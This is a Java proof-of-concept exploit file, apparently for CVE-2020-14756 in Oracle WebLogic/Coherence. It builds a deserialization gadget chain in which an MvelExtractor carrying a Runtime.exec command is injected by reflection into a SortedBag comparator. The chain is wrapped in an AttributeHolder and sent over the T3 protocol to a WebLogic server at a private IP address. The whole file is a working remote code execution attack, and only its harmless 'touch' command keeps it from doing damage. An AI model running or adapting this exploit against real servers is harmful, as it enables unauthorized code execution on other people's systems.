package com.supeream;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;


import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class CVE_2020_14756 {
    public static void main(String[] args) {
        MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"touch /tmp/621test\");");
        MvelExtractor extractor2 = new MvelExtractor("");

        try {
            SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
            AttributeHolder attributeHolder = new AttributeHolder();
            sortedBag.add(1);

            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, extractor);

            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);


            T3ProtocolOperation.send("192.168.129.142", "7001", Serializables.serialize(attributeHolder));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
